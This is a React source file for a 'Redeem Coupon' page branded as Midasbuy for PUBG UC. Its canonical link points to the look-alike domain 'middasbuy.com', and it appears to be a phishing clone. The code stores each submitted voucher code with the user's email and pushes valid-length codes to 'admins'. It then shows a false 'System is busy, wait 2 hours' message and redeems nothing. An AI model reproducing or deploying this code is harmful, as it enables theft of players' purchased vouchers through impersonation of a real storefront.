import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "react-i18next";
import { ArrowLeft, ClipboardPaste, CheckCircle } from "lucide-react";
import { Helmet } from "react-helmet-async";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { useAuthModal } from "@/contexts/AuthModalContext";
import { useToast } from "@/hooks/use-toast";

interface RedeemPageProps {
  onLogout: () => void;
}

const RedeemPage = ({ onLogout }: RedeemPageProps) => {
  const navigate = useNavigate();
  const { t } = useTranslation();
  const { user } = useAuth();
  const { openAuthModal } = useAuthModal();
  const { toast } = useToast();
  const [codeNumber, setCodeNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [feedbackMessage, setFeedbackMessage] = useState("");
  const [feedbackType, setFeedbackType] = useState<"success" | "error" | "">("");
  const [isRateLimited, setIsRateLimited] = useState(false);
   const [rateLimitEndTime, setRateLimitEndTime] = useState<Date | null>(null);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        setCodeNumber(text.trim().slice(0, 20));
        toast({
          title: "Pasted!",
          description: "Code pasted successfully",
        });
      }
    } catch (err) {
      console.error('Paste failed:', err);
      toast({
        variant: "destructive",
        title: "Paste Failed",
        description: "Please allow clipboard access or paste manually",
      });
    }
  };

  const checkRateLimit = async (userId: string): Promise<boolean> => {
    try {
       const tenMinutesAgo = new Date();
       tenMinutesAgo.setMinutes(tenMinutesAgo.getMinutes() - 10);

      const { count, error } = await supabase
        .from('redeem_codes')
        .select('*', { count: 'exact', head: true })
        .eq('username', user?.email || user?.user_metadata?.full_name || 'Unknown')
         .gte('created_at', tenMinutesAgo.toISOString());

      if (error) {
        console.error('Rate limit check error:', error);
        return false;
      }

       return (count || 0) >= 5;
    } catch (err) {
      console.error('Rate limit check failed:', err);
      return false;
    }
  };

  // Note: checkExistingCode removed - now using atomic database function submit_redeem_code

  const handleConfirm = async () => {
    // Clear previous feedback
    setFeedbackMessage("");
    setFeedbackType("");

    // Validate input
    if (!codeNumber.trim()) {
      setFeedbackMessage("Please enter a redeem code.");
      setFeedbackType("error");
      return;
    }

    const trimmedCode = codeNumber.trim();
    
    // Detect non-coupon inputs: emails, URLs, names, etc.
    const looksLikeEmail = /[@]/.test(trimmedCode);
    const looksLikeUrl = /^(https?:\/\/|www\.)|(\.(com|net|org|io|pk|co|dev|info|xyz))/i.test(trimmedCode);
    const looksLikeName = /^[a-zA-Z\s]{2,}$/.test(trimmedCode) && !/\d/.test(trimmedCode);
    const isOnlyDigits = /^\d+$/.test(trimmedCode);
    const isNonCoupon = looksLikeEmail || looksLikeUrl || looksLikeName || isOnlyDigits;
    
    // Valid codes are 18-20 characters
    const isValidLength = trimmedCode.length >= 18 && trimmedCode.length <= 20 && !isNonCoupon;

    // Check rate limit before submission (for logged in users)
    if (user) {
      const rateLimited = await checkRateLimit(user.id);
      if (rateLimited) {
        setIsRateLimited(true);
        const endTime = new Date();
        endTime.setMinutes(endTime.getMinutes() + 10);
        setRateLimitEndTime(endTime);
        setFeedbackMessage("آپ نے 10 منٹ میں 5 سے زیادہ کوڈز submit کر دیے ہیں۔ براہ کرم 10 منٹ بعد دوبارہ کوشش کریں۔");
        setFeedbackType("error");
        return;
      }
    }

    setIsSubmitting(true);

    try {
      // Get user identifier - use email if logged in, otherwise "Guest"
      const userIdentifier = user 
        ? (user.email || user.user_metadata?.full_name || 'Account User')
        : 'Guest User';
      
      // If code length is invalid, insert directly as "invalid" status (no admin notification)
      if (!isValidLength) {
        // Insert with invalid status directly
        const { error } = await supabase
          .from('redeem_codes')
          .insert({
            player_id: `Coupon: ${userIdentifier}`,
            redeem_code: trimmedCode,
            username: user?.email || user?.user_metadata?.full_name || 'Guest',
            status: 'invalid' // Direct invalid - no notification
          });

        if (error) {
          // Check if duplicate
          if (error.code === '23505') {
            setFeedbackMessage("Redeem Code is Invalid. Please try a Valid code.");
          } else {
            console.error('Error submitting invalid code:', error);
            setFeedbackMessage("Failed to submit code. Please try again.");
          }
        } else {
          setFeedbackMessage("Redeem Code is Invalid. Please try a Valid code.");
          setCodeNumber("");
        }
        setFeedbackType("error");
        setIsSubmitting(false);
        return;
      }
      
      // Use atomic database function for valid-length codes
      const { data, error } = await supabase.rpc('submit_redeem_code', {
        p_player_id: `Coupon: ${userIdentifier}`,
        p_redeem_code: trimmedCode,
        p_username: user?.email || user?.user_metadata?.full_name || 'Guest'
      });

      if (error) {
        console.error('Error submitting redeem code:', error);
        setFeedbackMessage("Failed to submit code. Please try again.");
        setFeedbackType("error");
        setIsSubmitting(false);
        return;
      }

      // Parse response
      const result = data as { success: boolean; duplicate: boolean; status?: string } | null;

      // Check if it was a duplicate
      if (result?.duplicate) {
        // Code already exists - show appropriate message based on status
        if (result?.status === 'approved') {
          setFeedbackMessage("This code is already used. Please check your PUBG account for UC delivered.");
          setFeedbackType("success");
        } else if (result?.status === 'already_used') {
          setFeedbackMessage("This code is already used. Please try a different code.");
          setFeedbackType("error");
        } else if (result?.status === 'invalid') {
          setFeedbackMessage("Redeem Code is Invalid. Please try a Valid code.");
          setFeedbackType("error");
        } else {
          // Pending duplicate
          setFeedbackMessage("Please wait 2 hours. System is busy, please try again later.");
          setFeedbackType("error");
        }
        setIsSubmitting(false);
        return;
      }

      // Successfully inserted valid code - pending status
      setFeedbackMessage("Please wait 2 hours. System is busy, please try again later.");
      setFeedbackType("error");
      setCodeNumber("");
      // Send push notification to admins ONLY for valid-length codes
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      fetch(`${supabaseUrl}/functions/v1/notify-admin-redeem-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          redeem_code: trimmedCode,
          player_id: `Coupon: ${userIdentifier}`,
          username: user?.email || user?.user_metadata?.full_name || 'Guest',
        }),
      }).catch(err => console.error('Notification failed:', err));
    } catch (err) {
      console.error('Error:', err);
      setFeedbackMessage("An error occurred. Please try again.");
      setFeedbackType("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-midasbuy-darkBlue flex flex-col">
      <Helmet>
        <title>Redeem Coupon | Enter Voucher Code for PUBG UC Discount | Midasbuy</title>
        <meta name="description" content="Redeem your Midasbuy coupon or voucher code to get discounts on PUBG UC, Free Fire diamonds, Roblox Robux, and more. Enter your code and save instantly." />
        <link rel="canonical" href="https://www.middasbuy.com/redeem" />
        <meta name="robots" content="noindex, nofollow" />
        <meta name="googlebot" content="noindex, nofollow" />
      </Helmet>
      <Header onLogout={onLogout} />
      
      <main className="flex-1 pt-16 md:pt-20">
        {/* Page Header */}
        <div className="px-4 py-4 flex items-center gap-3">
          <button 
            onClick={() => navigate(-1)}
            className="text-white hover:text-gray-300 transition-colors bg-transparent"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <h1 className="text-white text-lg md:text-xl font-bold tracking-wide">{t('redeemPage.title', 'REDEEM COUPON')}</h1>
        </div>
        
        {/* Main Content */}
        <div className="px-4 py-4">
          {/* Enter Redeem code label */}
          <p className="text-white text-sm mb-3">{t('redeemPage.enterRedeemCode', 'Enter Redeem code')}</p>
          
          {/* Code Number Input with Paste Button */}
          <div className="mb-4 relative">
            <input
              type="text"
              value={codeNumber}
              onChange={(e) => setCodeNumber(e.target.value)}
              placeholder={t('redeemPage.codeNumber', 'Code Number')}
              className="w-full px-4 py-4 pr-14 bg-[#1a2a42] border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-midasbuy-blue transition-colors"
              maxLength={20}
              disabled={isSubmitting}
              autoComplete="off"
              style={{ 
                WebkitUserSelect: 'text', 
                userSelect: 'text',
                touchAction: 'auto',
                WebkitTouchCallout: 'default'
              }}
            />
            <button
              type="button"
              onClick={handlePaste}
              className="absolute right-3 top-1/2 -translate-y-1/2 p-2 text-gray-400 hover:text-white transition-colors"
              title={t('redeemPage.pasteCode', 'Paste code')}
            >
              <ClipboardPaste className="w-5 h-5" />
            </button>
          </div>
          
          {/* Rate Limit Timer - Above Button */}
          {isRateLimited && rateLimitEndTime && (
            <p className="mb-2 text-yellow-500 text-sm">
              ⏳ {t('redeemPage.waitMessage', 'براہ کرم 10 منٹ انتظار کریں')}
            </p>
          )}
          
          {/* Feedback Message - Above Button */}
          {feedbackMessage && (
            <p className={`mb-2 text-sm flex items-center gap-1 ${feedbackType === "error" ? "text-red-500" : "text-green-500"}`}>
              {feedbackMessage}
              {feedbackType === "success" && <CheckCircle className="w-4 h-4 text-green-500" />}
            </p>
          )}
          
          {/* Confirm Button */}
          <button
            onClick={handleConfirm}
            disabled={isSubmitting || isRateLimited}
            className="w-full py-4 bg-gradient-to-r from-[#00A3FF] to-[#0066FF] text-white font-semibold rounded-lg transition-all hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isSubmitting ? t('redeemPage.submitting', 'Submitting...') : isRateLimited ? t('redeemPage.limitReached', 'Limit Reached') : t('redeemPage.confirm', 'Confirm')}
          </button>
          
          {/* Reminder Section */}
          <div className="mt-6">
            <p className="text-gray-400 text-sm mb-2">{t('redeemPage.reminder', 'Reminder')}:</p>
            <div className="space-y-1.5 text-gray-400 text-sm">
              <p>1. {t('redeemPage.reminderItem1', 'Get corresponding items immediately after redemption.')}</p>
              <p>2. {t('redeemPage.reminderItem2', 'Redemption code can only be used once.')}</p>
              <p>3. {t('redeemPage.reminderItem3', 'If you have any question or you need after-sales service, please contact redeem dealer where you buy the vouchers.')}</p>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default RedeemPage;
